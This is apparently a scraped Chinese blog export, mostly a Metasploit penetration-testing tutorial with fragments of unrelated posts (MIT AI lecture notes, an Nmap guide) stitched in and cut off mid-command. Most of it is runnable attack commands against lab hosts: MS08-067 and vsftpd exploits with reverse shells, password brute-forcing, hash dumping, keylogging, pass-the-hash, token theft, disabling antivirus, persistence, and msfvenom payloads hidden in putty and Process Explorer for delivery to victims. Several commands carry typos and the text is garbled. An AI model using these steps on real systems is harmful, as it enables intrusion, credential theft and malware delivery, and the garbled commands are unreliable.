对NAT后的主机进行攻击，可以使用已攻陷的主机作为跳板，将流量传送到内部的主机。 查看提供的扫描工具，本例中使用 SYN 端口扫描器： 12345search portscanuse auxiliary/scanner/portscan/synset RHOSTS 192.168.1.201set THREADS 50run 针对性扫描举例来说，在目标网络中快速扫描存在 MS08-067 漏洞的主机很常见，因为这是一个普遍存在的安全漏洞，并且能轻松获得 SYSTEM 权限。 服务器消息块协议扫描可以利用smb_version模块遍历一个网络，并获取Windows版本号。 1234use auxiliary/scanner/smb/smb_versionshow optionsset RHOSTS 192.168.1.201run 稍后可以使用 hosts 查看保存的结果。 搜寻配置不当的 Microsoft SQL ServerMS SQL 默认监听TCP 1433 端口，如果使用了随机的TCP端口，可以对UDP 1434 进行查询来获得这个随机的端口号。Metasploit 中有 mssql_ping模块实现。 12345use auxiliary/scanner/mssql/mssql_pingshow optionsset RHOSTS 192.168.1.0/24set THREADS 255run SSH 服务器扫描ssh_version可以识别SSH版本。 1234use auxiliary/scanner/ssh/ssh_versionset RHOSTS 192.168.67.0/24set THREADS 50run FTP 扫描1234use auxiliary/scanner/ftp/ftp_versionset RHOSTS 192.168.67.0/24set THREADS 255run 检查是否允许匿名登录，以及匿名用户的权限 1234use auxiliary/scanner/ftp/anonymousset RHOSTS 192.168.67.0/24set THREADS 50run 简单网管协议扫描SNMP 常用于网络设备，提供系统信息。模块scanner/snmp/snmp_enum，如果能够获取制度或者读写的团体字符串，将发挥重要作用，提供许多重要信息。短体字符串基本等同于查询设备信息或者写入设备配置参数所需的口令。得到团体字符串后，利用scanner/snmp/snmp_login模块可以尝试对一个IP或者一段IP使用字典破解团体字符串。 1234use auxiliary/scanner/snmp/snmp_loginset RHOSTS 192.168.1.0/24set THREADS 50run 编写自己的扫描器 漏洞扫描使用漏洞扫描器通常会在网络上产生大量流量，如果渗透测试工作不需要隐秘进行，使用漏洞扫描器非常方便。 基本的漏洞扫描使用 netcat 获取目标的旗标。一旦连接到一个服务端口或向他们发送特定指令时，就可以获得旗标，例如Web服务器。 12nc 192.168.67.140GET HTTP/1.1 会回复一个 400 错误，并说明服务器是 IIS 5.1，可以据此查找已知漏洞。 漏洞扫描器有时存在误报和漏报，常用的漏洞扫描器包括 Nexpose, Nessus 和一些专项扫描器。 使用 Nexpose 进行扫描扫描的目标是一个默认安装的 Windows XP SP2 主机，首先进行一次公开的白盒扫描，然后将结果导入 Metasploit。同时也可以在 MSF终端 调用Nexpose。 配置启动服务后，访问https://localhost:3780，接受Nexpose签发的服务器整数，用安装时设定的用户名和密码登录，并完成激活。 标签页： 资产（Assets）显示已经扫描过的计算机和设备 报告（Report）列出扫描后生成的报告 漏洞（Vulnerabilities）对在网络上发现的漏洞进行详细描述 管理（Administration）可以对系统配置进行修改 有创建站点向导、手动扫描向导、生成报告向导可以使用。 将扫描报告导入 Metasploit完成了一次完整的漏洞扫描后，在 msfconsole 中使用 db_nonect 创建一个新数据库，使用db_import将Nexpose的 XML 格式扫描报告文件导入数据库。Metasploit会识别出文件是由 Nexpose 生成的，并将扫描结果导入。随后使用db_hosts查看导入是否成功。 123db_connect postgres:toor@127.0.0.1/msf3db_import /tmp/host_195.xmldb_hosts -c address,svcs,vulns 如果想显示导入漏洞的详情可以使用db_vulns。 在 MSF 控制台中运行 NexposeMetasploit 中包含 Nexpose 插件，可以在MSF终端中完成漏洞扫描。扫描之前需要使用db_connect创建新的数据库。 12db_connect posttgres:toor@127.0.0.1/msf3load nexpose 使用help可以获得此插件的命令。第一次扫描之前需要连接到所安装的 Nexpose 实例，输入nexpose_connect -h可以显示连接参数，在这里需要提供连接 Nexpose 需要的用户名、密码和IP地址，在最后加上 ok 参数表示接受SSL证书警告。 123nexpose_connect -hnexpose_connect username:password@127.0.0.1 oknexpose_scan 192.168.67.140 扫描结束后，结果保存在了数据库中。 12db_hosts -c addressdb_vulns 使用 Nessus 进行扫描专用漏洞扫描器验证SMB登录这种扫描会留下大量记录 1234567use auxiliary/scanner/smb/smb_loginshow optionsset RHOSTS 192.168.67.140set SMBUser administratorset SMBPass 123456set VERBOSE falserun 扫描开放的VNC空口令新版本的VNC不允许空口令 1234use auxiliary/scanner/vnc/vnc_none_authshow optionsset RHOSTS 192.168.67.140run 扫描开放的X11服务器12345use auxiliary/scanner/x11/open_x11show optionsset RHOSTS 192.168.67.140set THREADS 50run 如果发现了漏洞，可以利用xspy记录键盘输入。 12cd /pentest/sniffers/xspy/./xspy -display 192.168.67.140 -delay 100 渗透攻击之旅渗透攻击基础12345678910show exploits # 显示所有可用的攻击模块show auxiliary # 显示所有辅助模块和他们的用途show options # 选择模块后，列出所需的参数back # 回到上一个状态search &lt;module&gt; # 查找特定的模块/漏洞use &lt;module&gt; # 加载模块，此时命令提示符会变化show payloads # 查看可用payloadset payload &lt;payload&gt; # 选择payloadshow targets # 列出受影响的系统info # 提供正在使用的模块的详细信息 模块中的参数只有两个状态，set 和 unset。有些参数是必填的（required），必须手工设置并且处于启用状态。使用 set 命令可以对某个参数进行设置并启用，unset 可以禁用相关参数。 1234set RHOST 192.168.67.140set TARGET 4show optionsunset RHOST setg 和 unsetg 是上面两个的全局版本，有些参数不会经常改变，比如 LHOST 可以通过setg 设置。 save 命令可以把使用 setg 设置的全局参数保存下来，下次启动 msfconsole 时可以继续使用。在任何时候都可以使用 save 保存当前状态。 攻击 Windows靶机：Windows XP SP2 和 Ubuntu 9.04，Windows 配置了 IIS 和 SQL Server。 利用 MS08-067 漏洞 使用 nmap 扫描脚本，扫描Windows 1nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.67.140 -sT隐秘的tcp连接扫描，-A高级系统探测功能，扫描结果显示MS08-067: VULNERABLE。 MS08-067 漏洞高度依赖于系统版本，所以我们手动指定目标版本，保证能触发正确的一处代码。 12345678910search ms08_067_netapiuse exploit/windows/smb/ms08_067_netapiset PAYLOAD windows/meterpreter/reverse_tcpshow targetsset TARGET 4set RHOST 192.168.67.140set LHOST 192.168.67.136set LPORT 8080show optionsexploit 先查找 MS08-067 的攻击模块，使用 use 加载。设置 payload 位基于 Windows 的 reverse_tcp，这个模块会从目标主机发起一个反弹连接，连接到 LHOST，可以绕过防火墙或者穿透 NAT 网关。show targets 让我们识别和匹配目标操作系统类型（多数模块会自动识别），指定了系统。 Windows XP SP2 English（AlwaysOn NX）意思时不允许执行，即启用 DEP 保护（默认）。设置 RHOST 指定目标， LHOST LPORT 指定监听的TCP端口（使用常见端口可以帮助绕过防火墙）。show options 确认参数都已经设置正确。exploit 初始化攻击环境，并开始对目标进行攻击尝试，成功会返回一个 reverse tcp 方式的 meterpreter 会话。 此时可以使用 session -l 查看远程运行的 meterpreter 状况。如果同时对多个目标进行了攻击，会同时开启多个会话。sessions -i 1指与ID为 1 的控制会话交互。如果这个会话是一个反向连接命令行 shell，这个命令会把我们带到命令提示符状态下。输入 shell，进入目标系统的交互命令行shell。 攻击 Metasploitable与上面类似 1nmap -sT -A -P0 192.168.67.141 发现 22 个开放端口，主机操作系统为 Debian，运行 vsftpd 2.3.4。 1234567search vsftpduse exploit/unix/ftp/vsftpd_234_backdoorshow payloadsset PAYLOAD cmd/unix/interactshow oprtionssetg RHOST 192.168.67.141exploit 这是命令执行攻击 ，成功率很高，标注了 excellent。使用了一个 bind 的交互式 shell，在目标主机打开了一个端口，连接到目标主机。 全端口攻击载荷：暴力破解目标开放的端口如果攻击的组织内部设置了严格的出站端口过滤，可以使用专用的攻击载荷辅助逐个尝试可用的端口。 以攻击 windows 为例 123456789use windows/smb/ms08_067_netapiset LHOST 192.168.67.136set RHOSTs 192.168.67.140set TARGET 4search portsset PAYLOAD windows/meterpreter/reverse_tcp_allportsexploit -jsessions -l -vsession -i 3 对所有端口进行了尝试，直到发现放行的段偶。 资源文件resource file 指 msfconsole 中包含一些列自动化命令的脚本文件，这是一个可以在 msfconsole中执行的命令列表，列表中的命令顺序执行。资源文件可以简化攻击过程，使用resource命令载入资源文件，或者在OS命令行中使用 -r将资源文件作为 msfconsole 的一个参数 。 创建一个能够显示 metasploit 版本并且载入声音插件的资源文件 123echo version &gt; resource.rcecho load sounds &gt;&gt; resource.rcmsfconsole -r resource.rc 实际环境中可以使用更复杂的资源文件，自动进行攻击，比如自动执行SMB攻击，resource.rc内容如下： 12345use explooit/windows/smb/ms80_067_netapi set RHOST 192.168.67.140set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136exploit 终端执行 12msfconsoleresource resource.rc 后面可以使用 Karmetasploit 创建复杂的资源文件。 Meterpreter使用 Meterpreter 前需要攻陷系统，来获得一个 meterpreter shell 攻击 Windows攻击 MSSQL这次攻击 MSSQL 服务。 12nmap -sT -A -P0 192.168.67.140nmap -sU 192.168.67.140 -p1434 这里MSSQL使用了默认的1433端口，如果不是，可以用mssql_ping模块查找MSSQL服务端口。使用mssql_login可以尝试对 sa 用户密码进行破解。 1234567891011use auxiliary/scanner/mssql/mssql_pingshow optionssetg RHOSTS 192.168.67.140runuse auxiliary/scanner/mssql/mssql_loginshow optionsset PASS_FILE /usr/share/set/src/fattrack/wordlist.txtset THREADS 10set VERBOSE falseset USERNAME saexploit 上面爆破出了 sa 的密码 password123。 xp_cmdshellxp_cmdshell是MSSQL默认装载的内奸存储程序，可以直接执行操作系统命令。下面使用mssql_payload与xp_cmdshell交互，添加本地管理员，通过可执行文件写入payload。 12345678use exploit/windows/mssql/msql_payloadshow optionsset payload windows/meterpreter/reverse_tcpsetg LHOST 192.168.67.136setg LPORT 443setg RHOSTS 192.168.67.140set PASSWORD password123exploit 成功后就得到了一个 meterpreter 会话 meterpreter 基本命令获得 meterpreter shell 后，可以利用一些基本命令获得更多信息，使用help可以得到帮助。 screenshot ，截屏 sysinfo ，获取系统运行的平台 ps ，获得进程列表 migrate ，迁移到目标进程空间 可以获取键盘记录 1234ps # 看到explorer.exe，进程号为1824migrate 1824 # 迁移到 explorer.exe 的进程空间run post/windows/capture/keylog_recorder # 获取记录^C # 一段时间按后使用 CTRL+C 停止，记录保存 获得用户名和密码Windows 系统存储用户密码哈希值方式一般有 LAN Manager(LM), NTLAN Manager(NTLM), NTLAN Manager v2(NTLMv2)。 使用 Meterpreter 命令获取哈希值12use privrun post/windows/gather/hashdump 开头为aad3b的哈希值是一个空的哈希值。 传递哈希值虽然得到了哈希值，但很难破解复杂的密码。使用哈希值传递技术可以只用哈希值登录。 1234567use windows/smb/psexecset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136set LPORT 443set RHOSTS 192.168.67.140set SMBPass &lt;hash&gt;exploit 权限提升在目标机器上创建新用户bob，运行生成的 payload.exe 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.67.136 LPORT=443 -f exe -o payload.exe 运行后，使用 msfconsole 管理 shell 12345678910use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.67.136set LPORT 443exploit...getuidshellC:\\Documents and Settings\\bob\\Desktop&gt;net user bob^Z 在这里，获得了shell，用net user 命令发现 bob 是 User 组的用户，不是管理员，然后使用 CTRL+Z 保留会话（也可以使用background），稍后使用 sessions -l 和 sessions -i &lt;id&gt;能够回到 meterpreter shell。 123use privgetsystemgetuid 使用特权模块，然后尝试获取本地管理员或者 SYSTEM 权限，使用 getuid 查看结果。 令牌假冒使用 ps 命令后，可以看到 cmd.exe ，进程号2780，我们所在域是 metasploit， 域管理员为 administrator。 1steal_token 2780 这时 Meterpreter 是以域管理员来运行的。 有时 ps 不能列出域管理员运行的进程，可以使用incognito列举系统上可以使用的令牌。 123456use incognitolist_tokens -uimpersonate_token METASPLOIT\\\\Administratoradd_user omgcompromised p@55word! -h 192.168.1.210add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.1.210# 192.168.1.210 是域控制器的地址 跳板攻击使用 Meterpreter 进行跳板攻击例子中，我们从一个子网攻击一个目标系统，然后通过这个系统建立路由攻击其他及其。首先尝试对 Windows XP 进行攻击，然后以此作为据点，对目标内部网络的一个Ubuntu 系统进行攻击。 假设已经获取了某个服务器的访问权限，需要关注的市如何与目标网络建立连接。使用scripts/meterpreter目录下的 Meterpreter 外部脚本，提供了可以使用的额外脚本。 1234run get_local_subnetsbackgroundroute add 192.168.39.0 255.255.255.0 1route print 首先显示了被控系统上的本地子网，将会话后台运行，在MSF终端中添加路由命令，告知系统将远程网络ID（受控主机的本地子网）通过攻击会话1 路由，然后通过route print显示当前活跃的路由设置。 然后对目标Linux系统进行第二次渗透攻击，使用基于 VSFTPD 的攻击，存在于 Metasploitable 靶机上。 1234567use exploit/unix/ftp/vsftpd_234_backdoorset PAYLOAD cmd/unix/interactset RHOSTS 192.168.39.150ifconfigexploitcat /etc/*releasebackground 通过 ifconfig 显示网络信息，然后与 RHOSTS 和LHOST对比，可以看到 LHOST 指定的是攻击机的IP地址，RHOST是 目标网络子网的地址。如果希望进一步对内网进行跳板扫描，可以使用 scanner/portscan/tcp 模块，可以使用已建立的路由通道。 使用load auto_add_route命令可以自动化添加路由 使用 Meterpreter 脚本通过run &lt;script&gt;可以在 meterpreter 终端中运行扩展脚本。 VNC 123run vncrun screenrun screen_unlock 获得一个 VNC 连接。 迁移进程 攻击系统时，使用迁移进程可以进入稳定的，不会关闭的服务进程中，以便维持稳定的系统控制连接。 1run post/windows/manager/migrate 关闭杀软 1run killav 获取系统密码哈希值 1run hashdump 查看流量 1run packetrecorder -i 1 获取系统信息 1run scraper 控制持久化 注入 meterpreter 代理，确保重启之后 meterpreter 还能运行，如果是反弹连接方式可以指定连接间隔；绑定方式可以设置在指定时间绑定开放端口。渗透完成后如果不移除，任何攻击者都可以获得这个系统的访问权。 123456run persistence -X -i 50 -p 443 -r 192.168.1.107use multi/hadlerset payload windows/meterpreter/reverse_tcpset lport 443set lhost 192.168.1.107exploit 开机自启动 -X，50秒重连一次-i 50，端口443 -p 443，连接的目的IP -r 192.168.1.107，使用use multi/handler监听。 移除 Meterpreter 代理的方式是删除 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\中的注册表键和C:\\WINDOWS\\TEMP中的 VBS 文件 将命令行 shell 升级为 Meterpreter可以在系统被攻陷时使用session -u将命令行 shell 提升为 Meterpreter。例子中使用MS08-067反弹命令行shell，然后升级为 Meterpreter shell。 12345678910search ms08_067use exploit/windows/smb/ms08_067_netapiset payload windows/shell/reverse_tcpset target 4setg lhost 192.168.6.1136setg lport 8080exploit -z# session ID: 18session -u 18sessions -i 10 通过附加的 Railgun 组件操作 Windows API12irbclient.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;orlde&quot;&quot;MB_OK) 通过 irb获得一个交互式 Ruby shell，允许用 Ruby 语法与 Meterpreter 交互。 msfvenom代替了原来的 msfpayload 和 msfencode，是这两个的结合体。 生成 payload需要两个必要参数，-p和-f -p参数指定特定的payload，可以使用如下命令列出所有可以使用的payload 1msfvenom -l payloads 也支持使用 - 作为值从标准输入中读取自定义 payload 1cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw -f指定 payload 输出格式，例如 1msfvenom -p windows/meterpreter/bind_tcp -f exe 可以通过以下命令查看支持的格式 1msfvenom --help-formats 典型使用 1msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe 对payload进行编码默认情况下，当使用-b选项时（badchar），编码功能自动启用。其他情况下，必须使用-e选项开启编码功能，例如： 1msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw 使用-l参数可列出可用编码器 1msfvenom -l encoders 有时可以通过-i参数将一个payload多次编码，绕过杀软，但是编码并不是免杀的方案 1msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 避免使用某些字符-b参数使用时，某些字符不会出现在payload中，msfvenom会自动使用何时的编码器编码 payload 1msfvenom -p windows/meterpreter/bind_tcp -b '\\x00' -f raw 提供自定义模板默认情况下，msfvenom 使用保存在msf/data/templates下的模板文件，使用-x参数可以指定自己的模板 1msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 如果想使用自定义的基于64位操作系统的模板，-f参数中的 exe 需要修改为 exe-only。 -x与-k通常同时使用，这样可以将模板中的payload作为新线程运行，但是只适用于较老的机器。 将msfvenom的输出串联（利用管道重定向）旧的 msfpayload 和 msfencode 经常串联使用，并且可以按照多种编码顺序排列，msfvenom也可以这样使用 123msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \\msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe 免杀技术杀软通常通过特征码对文件进行检测，我们可以针对目标创建一个独一无二的 payload。直接攻击时，payload还可以仅在内存中运行，不写入硬盘。 使用 MSF 攻击载荷生成器创建可独立运行的二进制文件这里使用 msfvenom 载入 windows/shell_reverse_tcp 载荷，使用--payload-options查看参数 12msfvenom -p windows/shell_reverse_tcp --payload-optionsmsfvenom -p windows/shell_reverse_tcp LHOST=193.168.67.136 LPORT= 443 -f exe -o payload1.exe 启动监听 123use exploit/multi/handlerset payload windows/shell_reverse_tcpshow options 躲避杀软检测使用 MSF 编码器用msfvenom -h查看帮助，msfvenom -l encoders列出可用的编码器。将生成的原始数据输入编码器并查看新生成的文件。 1msfvenom -p windows/shell_reverse_tcp LHOST 192.168.671.36 LPORT=443 -e x86/shikata_ga_nai -f exe -o payload2.exe 多重编码1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.67.136 LPORT=443 -e x86/shikata_ga_nai -i 10 -f raw |msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -o payload3.exe -i参数表示次数，这里总共执行了不同的35次编码，但是依然无法成功突破杀软检测。 自定义可执行文件模板通常，msfvenom会将攻击载荷嵌入默认的可执行文件模板，位于data/templates/template.exe，这个文件会受到杀软的关注。现在的msfvenom支持使用-x使用任意的 Windows 可执行程序代替默认模板文件，例如将微软Sysinternals中的Process Exploerer最为模板。 12345wget http://download.sysinternals.com/files/ProcessExplorer.zipcd workunzip ../ProcessExplorer.zipcd ..msfvenom -p windows/shell_reverse_tcp LHOST=192.168.67.136 LPORT=8080 -e x86/shikata_ga_nai -x work/procexp.exe -i 5 -f exe -o /var/www/pe_backdoor.exe 隐秘地启动一个攻击载荷被攻击的用户打开刚刚生成的文件时，什么都没有发生，可以引起用户的怀疑。我们可以在启动攻击载荷的同时让宿主程序能够正常运行。 123wget https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exemsfcenom -p windows/shell_reverse_tcp LHOST=192.168.67.136 LPORT=443-e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o /var/www/putty_backdoor.exe 用-k选项处理 putty，会配置攻击载荷在一个独立的线程中启动，这样宿主程序不会受影响，但不是所有可执行程序都支持-k选项。如果没有使用-k选项，最好使用图形界面。否则cmd窗口直到攻击载荷使用完毕才会关闭。 加壳软件加壳能够减小文件大小，而且不影响原有的功能。下面使用 UPX 加壳，尝试进行免杀处理 1upx -5 payload3.exe Metasploit Pro 的动态载荷客户端渗透攻击基于浏览器的渗透针对浏览器的攻击与传统的渗透攻击不同在于 shellcode 触发方式不同。传统渗透攻击中，攻击者的全部目标时获取 RCE 的机会，植入一个 payload。然而在浏览器渗透攻击中，为了能够执行特殊构造的 payload，通常采用堆散射（heap sparying）的漏洞利用技术。 堆是指用于动态分配的进程内存空间，应用程序在运行时按需对这段内村惊醒申请和使用。堆空间的大小取决于计算机的可用内存空间，以及在软件生命周期中已使用的内存空间。在程序的运行过程中，对于攻击者而言，内存的分配地址是位置的，所以不能简单地跳转到某一地址。 空指令（NOP）是不做任何事情，直接执行下一条指令。空指令滑行区（NOP slide）是很多空指令相连组成的一个区域。空指令对应的操作码是 90，通常以\\x90的形式出现在渗透代码中。 堆散射技术是指将空指令滑行区与 shellcode 组合成固定的形式，将它们重复填充到堆中，直到填满一大块内存空间。堆中的内存分配实在程序运行时动态执行的，通常利用浏览器执行 JS 申请大量内存，当程序执行流改变时，程序会随即跳转到某个地方，很可能这个地方已经被空指令滑行区覆盖，可以执行紧随其后的 shellcode。 使用 ollydbg 调试器获得空指令机器码1msfvenom -p windows/shell/bind_tcp LPORT=443 -f c -o shellcode1.c 执行之后会输出两个 shellcode，第二部分是在第一部分的shellcode 打开的端口有请求是，Metasploit 会自动发送的。将生成的第一部分 shellcode 中的/x去掉以便使用 ollydbg 调试，可以在前面加上许多90。 随便打开一个程序，打开 ollydbg，选择 File 中的 Open，指向一个可执行程序。在出现的许多汇编指令中，点击第一条，按住 SHIFT 和左键选中接下来的300条指令。赋值刚才的shellcode，在调试窗口中粘贴，可以看到一些空指令和 shellcode。当第一次输出 bind_tcp 格式的 shellcode 时，可以看到第一阶段结束指令时 ecc3，定位这个以 ecc3结尾的指令块。 在 ecc3 的下一条指令设置断点，回到加入空指令的指令区域顶端，F5，执行到断点前，这时已经打开了端口，可以通过netstat -an查看。在 metasploit 中打开一个多线程监听器，这会向第一阶段打开的端口发送第二段 shellcode，获取控制会话。 对 IE 的极光漏洞进行渗透利用1234567use windows/browser/ms10_002_auroraset payload windows/meterpreter/reverse_tcpshow optionsset srvport 80set lhost 192.168.67.136set lport 443exploit -z 设置完成后，可以使用 Windows XP 虚拟机访问 http://&lt;srvhost&gt;:&lt;srvport&gt;，连接到该网站后，虚拟机稍微有些迟钝，稍后就会得到一个 meterpreter shell。但是用户一旦关闭浏览器就会失去连接。一旦建立连接，应该立刻运行run migrate迁移到新的独立进程内存空间。 1run migrate -f 可以使用高级选项进行自动化，比如想改变反弹式连接每次尝试连接的次数。或者自动迁移到新进程。 123show advancedset ReverseConnectRetries 10set AutoRunScript migrate -f 这是一个基于浏览器的攻击，很可能获得的是用户权限的 shell，使用usee priv和getsystem尝试提权。 文件格式漏洞渗透攻击有的应用程序存在由输入文件格式类型 bug 导致的可利用的安全漏洞，比如 Adobe PDF。下面利用 MS11_006，这时一个利用系统函数CreateSizedDIBSECTION中的栈溢出的漏洞。 12345use exploit/windows/fileformat/ms11_006_createsizeddibsectioninfoset payload windows/meterpreter/reverse_tcpset target 2exploit 发送攻击负载上面生成了 msf.doc，可以通过邮件发送给用户。实际发送这个文档之前，必须在模块中建立一个多线程监听端，可以保证渗透攻击发生时，攻击主机可以收到来自目标主机的连接请求。 12345use multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.67.136set lport 443exploit -j Metasploit 辅助模块辅助模块（auxiliary）主要提供信息搜集的支持，也提供一些后渗透攻击模块。 可以使用show auxiliary列出可用辅助模块。 使用辅助模块比如想攻击一台 web 服务器，可以使用search scanner/http查找可用的 HTTP 扫描器。旧版 IIS 服务器的 WebDAV 功能存在一个可用于远程攻击的漏洞，可以针对目标进行一次扫描。 1234use scanner/http/webdav_scannershow options...run 辅助模块剖析 社会工程学工具包配置","link":"/2019/10/06/metasploit/"},{"title":"mit-ai","text":"B站视频，MIT的入门课程 例子：将B1放到B2上 goal tree, and/or tree，目标树，建立了目标树的程序可以回答关于自身行为的问题。回答 why problem 时，向上一层；回答 how problem 时，向下一层就可以得到答案。 西蒙：行为的复杂性来源于环境的复杂性与程序的复杂性中的较大值。 例子：识别动物园的动物种类 基于规则的专家系统，rule based expert system，从已知的事实推出结论的，称为 forward-chaining system，forward chain本身形成了一个目标树，可以回答关于自身行为的问题。给出一个假设，通过规则向前考虑，称为backward-chaining system，forward 或者 backward 都称为 deduction system。 例子：杂货装袋 知识工程，knowledge engineering，三个规则。一、考虑个案，可以得到别人通过其他方式无法告诉你的知识。二、考虑看起来一样的，但实际处理起来不一样的东西。三、建立系统然后看它何时出错，可以知道系统缺少什么规则。 turn blue可以表示厌烦 搜索是关于选择的，以地图为例 search backtracking British Museum N Depth First Y Breadth First 搜素的具体实现（Depth First） 初始化一个队列 （如果第一个路径不是所需要的路径，则）扩展队列中的第一个路径，将新路径放在队首。（Breadth First的新路径放到队尾）","link":"/2020/01/22/mit-ai/"},{"title":"Nmap","text":"Nmap 使用方法、小技巧 Nmap中文手册，保存为 HTML 格式打开 基本扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273nmap -T4 -sn [ip] # 主机发现nmap -T4 [ip] # 端口扫描nmap -T4 -sV [ip] # 服务扫描nmap -T4 -O [ip] # 操作系统扫描# 扫描选项-sP # 只扫描在线情况-sS # SYN 扫描-sT # TCP 扫描-sU # UDP 扫描-sV # 服务版本检测-O # 操作系统识别-p # 指定扫描的端口，使用 -p- 扫描全端口-F # 快速扫描最可能开放的 100 个端口-n/-R # 不使用/总是使用 DNS 解析--scanflags # 指定 TCP 标志位，包括 URG, ACK, PSH, RST, SYN, FIN# 时序选项-T0 偏执的：非常非常慢，用于IDS逃逸-T1 猥琐的：相当慢，用于IDS逃逸-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍-T3 普通的：默认，根据目标的反应自动调整时间模式-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口# 脚本-sC 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别 –script=&lt;Lua scripts&gt; &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述–script-args=&lt;n1=v1,[n2=v2,...]&gt; 为脚本提供默认参数–script-args-file=filename 使用文件来为脚本提供参数–script-trace 显示脚本执行过程中发送与接收的数据–script-updatedb 更新脚本数据库–script-help=&lt;scripts&gt; 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别# 脚本分类auth 负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute 提供暴力破解方式，针对常见的应用如http/snmp等default 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery 对网络进行更多的信息，如SMB枚举、SNMP查询等dos 用于进行拒绝服务攻击exploit 利用已知的漏洞入侵系统external 利用第三方的数据库或资源，例如进行whois解析fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware 探测目标机是否感染了病毒、开启了后门等信息safe 此类与intrusive相反，属于安全性脚本version 负责增强服务与版本扫描（Version Detection）功能的脚本vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067按脚本分类扫描# 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令nmap --script=auth 192.168.137.*# 提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解nmap --script=brute 192.168.137.*# 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*# 检查是否存在常见漏洞nmap --script=vuln 192.168.137.* # 在局域网内探查更多服务开启状况nmap -n -p445 --script=broadcast 192.168.137.4# 利用第三方的数据库或资源，例如进行whois解析nmap --script external 202.103.243.110 高级扫描12345678-iflist # 查看本地路由和接口，当遇到无法达到目标主机或想选择从多块网卡中某一特定网卡访问目标主机时，可以查看nmap –iflist中提供的网络接口信息。-e [interface] # 指定使用特定网口发送数据，可参考 -iflist 信息-S [spoofip] # 使用特定源 IP 发送数据-D [ip1/ME],[ip2/ME]... # 使用诱骗方式隐藏真实扫描地址，使用多个IP同时扫描，ME代表自己的真实地址-g/-sourve-port # 指定源端口-spoof-mac # 指定欺骗的 MAC 地址-scanflag # 定制 TCP 胡举报标志位，包括 URG, ACK, PSH, RST, SYN, FIN-ip-options # 定制 IP 包的 OPTIONS 字段 Nmap 端口状态 状态 说明 open 应用程序在该端口接收 TCP 连接或者 UDP 报文 closed 关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听 filtered 由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙 unfiltered 未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态 open | filtered 无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议， FIN, Null 等扫描会引起。 扫描防火墙 命令 类型 说明 nmap -sS [ip] SYN 扫描 - nmap -sF [ip] FIN 扫描 识别端口是否关闭，收到RST说明端口关闭，否则为 open 或者 filtered nmap -sA [ip] ACK 扫描 识别端口是否被过滤，收到RST说明端口未被过滤（open 或者 closed） nmap -sW [ip] Window 扫描 只用于某些 TCP/IP 协议实现，发送ACK，检查回复的RST包中的 Window size，关闭的端口为0，开放的端口非0 用以上方式交叉扫描可以得出端口的真实状态。 扫描路由器123456nmap -p1-25,80,512-515,2001,4001,6001,9001 [subnet] # 思科路由器在上述端口中运行了一些常见服务，列出这些端口开放的主机可以帮助定位路由器的IP地址可端口状态nmap –sU –p69 –nvv [ip]# 多数路由器支持 TFTP（简单文件传输协议）用于备份和回复路由器配置文件，运行在 UDP 69 端口nmap -F -O -n [ip]# 扫描操作系统 扫描互联网1nmap -iR 100000 -sS -PS80 -p 80 -oG nmap.txt 随机生成 10w 个 IP 地址，对它们的80端口进行扫描，将结果以 grepable 格式输出到 nmap.txt 1nmap -iR 1200000 -sL -n | grep ”not scanned” | awk ’{print $2}’ | sort -n | uniq &gt;! tp; head -25000000 tp &gt;! 